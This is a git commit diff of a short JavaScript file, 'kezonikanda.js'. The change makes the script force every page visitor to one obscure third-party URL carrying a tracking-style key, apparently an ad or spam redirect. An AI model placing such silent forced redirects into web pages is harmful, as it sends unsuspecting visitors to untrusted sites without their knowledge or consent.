63612e8885b5c84b2e1a5e6b1469ef1f7d950793
leswarokojit <84512579+leswarokojit@users.noreply.github.com>
2022-01-29 19:42:37 +0800

    Update kezonikanda.js

--- kezonikanda.js
+++ kezonikanda.js
@@ -1,5 +1,6 @@
-var urlmain = document.URL;
-var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
-var dataUrl = ["https://dev-nexone.pantheonsite.io/"];
+var dataUrl = [
+
+  'https://engagedpungentrepress.com/i8qigyrv?key=489a4f2de7d0a6399f00397a1ce9becb'
+];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
-window.location = randomItem + param;
+window.location = randomItem;
